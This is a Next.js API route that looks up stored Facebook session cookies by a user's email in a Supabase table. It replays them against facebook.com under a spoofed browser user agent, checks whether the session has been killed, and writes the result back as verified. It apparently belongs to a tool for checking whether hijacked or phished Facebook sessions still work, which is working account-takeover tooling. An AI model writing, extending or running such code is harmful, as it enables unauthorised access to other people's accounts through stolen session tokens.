import { NextRequest, NextResponse } from "next/server";
import { supabase } from "@/lib/supabaseClient";

export async function POST(req: NextRequest) {
  try {
    const { email } = await req.json();
    if (!email) {
      return NextResponse.json({ valid: false, error: "Email required" }, { status: 400 });
    }

    // Get cookies from Supabase
    const { data, error } = await supabase
      .from("sessions")
      .select("cookies")
      .eq("user_email", email)
      .order("updated_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    if (error || !data?.cookies || !Array.isArray(data.cookies) || data.cookies.length === 0) {
      return NextResponse.json({ valid: false, error: "No cookies found" });
    }

    // Build cookie header
    const cookieHeader = data.cookies
      .map((c: any) => `${c.name}=${c.value}`)
      .join("; ");

    // Test against Facebook — check if session is killed
    const res = await fetch("https://www.facebook.com/", {
      headers: {
        "Cookie": cookieHeader,
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
      },
      redirect: "manual",
    });

    // Check Set-Cookie headers for c_user=deleted
    let killed = false;
    const setCookie = res.headers.get("set-cookie");
    if (setCookie && /c_user=deleted/i.test(setCookie)) {
      killed = true;
    }

    // Also check via getSetCookie if available (Node 18+)
    try {
      const getSetCookie = (res.headers as any).getSetCookie?.();
      if (getSetCookie && Array.isArray(getSetCookie)) {
        for (const sc of getSetCookie) {
          if (/c_user=deleted/i.test(sc)) { killed = true; break; }
        }
      }
    } catch {}

    const valid = !killed;

    // Update verification status in Supabase (graceful if columns don't exist yet)
    try {
      await supabase.from("sessions").update({
        verified: valid,
        verified_at: new Date().toISOString(),
      }).eq("user_email", email);
    } catch {
      // Columns may not exist yet — verification result still returned
    }

    return NextResponse.json({ valid, killed });
  } catch (e: any) {
    return NextResponse.json({ valid: false, error: e.message }, { status: 500 });
  }
}
